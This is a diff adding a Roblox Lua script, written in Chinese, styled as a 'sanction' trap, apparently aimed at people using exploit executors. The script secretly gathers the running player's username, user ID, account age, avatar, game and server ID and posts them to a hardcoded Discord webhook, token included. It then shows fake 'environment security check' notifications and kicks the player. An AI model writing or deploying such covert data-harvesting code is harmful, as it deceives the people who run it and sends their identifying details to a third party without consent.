@@ -1,0 +1,59 @@
+-- [[ 貓の家 - 制裁系統 (直接觸發版) ]]
+
+local WebhookURL = "https://discord.com/api/webhooks/1456304374694412400/f5v3zsWGD-rWA5gS3c0epqk_XnXjWzDur7eqcHgD8Vn59dbYCXL-eXghWpFb964wJGY_"
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- 🚨 1. 秘密收集資訊並回傳
+task.spawn(function()
+    pcall(function()
+        -- 抓頭像
+        local thumbApi = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..player.UserId.."&size=420x420&format=Png&isCircular=true"
+        local thumbRes = HttpService:JSONDecode(game:HttpGet(thumbApi))
+        local avatarUrl = thumbRes.data[1] and thumbRes.data[1].imageUrl or ""
+
+        local data = {
+            ["username"] = "貓の家 - 陷阱日誌",
+            ["avatar_url"] = "https://rbxassetid.com/8565635516",
+            ["embeds"] = {{
+                ["title"] = "🚨 捕獲目標！制裁程序啟動",
+                ["description"] = "目標已踏入陷阱，正在執行數據抓取...",
+                ["color"] = 16711680,
+                ["thumbnail"] = {["url"] = avatarUrl},
+                ["fields"] = {
+                    {["name"] = "玩家名稱", ["value"] = player.Name, ["inline"] = true},
+                    {["name"] = "玩家 ID", ["value"] = "```" .. tostring(player.UserId) .. "```", ["inline"] = true},
+                    {["name"] = "帳號天數", ["value"] = player.AccountAge .. " 天", ["inline"] = true},
+                    {["name"] = "所在遊戲", ["value"] = "https://www.roblox.com/games/" .. game.PlaceId},
+                },
+                ["footer"] = {["text"] = "目標 JobId: " .. game.JobId}
+            }}
+        }
+
+        local requestFunc = syn and syn.request or http and http.request or http_request or request
+        if requestFunc then
+            requestFunc({
+                Url = WebhookURL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end)
+
+-- 🚨 2. 螢幕轟炸與最終踢出
+task.spawn(function()
+    for i = 1, 5 do
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "🚫 系統警告 🚫",
+            Text = "正在檢測環境安全性... (" .. i .. "/5)",
+            Icon = "rbxassetid://8565635516",
+            Duration = 2
+        })
+        task.wait(0.8)
+    end
+    
+    task.wait(0.5)
+    player:Kick("\n\n【 貓  の  家  制  裁 】\n\n偵測到異常活動喵！\n您的資訊已成功回傳至 Discord 控制台。\n\n請勿嘗試非法操作，祝您愉快喵～🐾")
+end)
